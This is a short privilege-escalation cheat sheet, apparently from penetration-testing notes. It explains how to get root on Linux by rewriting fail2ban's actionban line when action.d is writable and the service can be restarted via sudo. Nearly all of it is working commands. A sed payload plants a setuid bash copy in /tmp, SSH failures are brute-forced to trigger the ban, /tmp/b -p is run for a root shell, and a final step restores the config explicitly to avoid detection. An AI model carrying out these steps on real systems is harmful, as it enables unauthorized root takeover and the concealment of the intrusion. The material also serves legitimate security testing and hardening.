# fail2ban actionban Arbitrary Command (Writable action.d)

If the current user can write to `/etc/fail2ban/action.d/` and restart fail2ban as root (via sudo), replace `actionban` in the active action config with a payload. When fail2ban triggers a ban (after enough failed auth attempts), the payload runs as root.

**Confirm write access and sudo:**
```bash
ls -ld /etc/fail2ban/action.d/
# drwxrwx--- root <group> → current user in <group>
sudo -l
# (root) NOPASSWD: /etc/init.d/fail2ban restart
```

**Find which action config is active:**
```bash
grep -i "banaction" /etc/fail2ban/jail.conf /etc/fail2ban/jail.local 2>/dev/null
# banaction = iptables-multiport
```

**Overwrite actionban in that config:**
```bash
cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf.bak
# Replace the actionban line:
sed -i 's|^actionban = .*|actionban = cp /bin/bash /tmp/b; chmod 4777 /tmp/b|' \
  /etc/fail2ban/action.d/iptables-multiport.conf
```

**Restart fail2ban:**
```bash
sudo /etc/init.d/fail2ban restart
```

**Trigger a ban by generating failed auth attempts:**
```bash
# From attacker machine — trigger SSH failures:
for i in {1..10}; do ssh wronguser@<TARGET>; done
# or: hydra/nxc bruteforce against SSH (5+ failures usually enough)
```

**Get root shell:**
```bash
/tmp/b -p
```

Restore the config after exploitation to avoid detection:
```bash
cp /tmp/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
sudo /etc/init.d/fail2ban restart
```
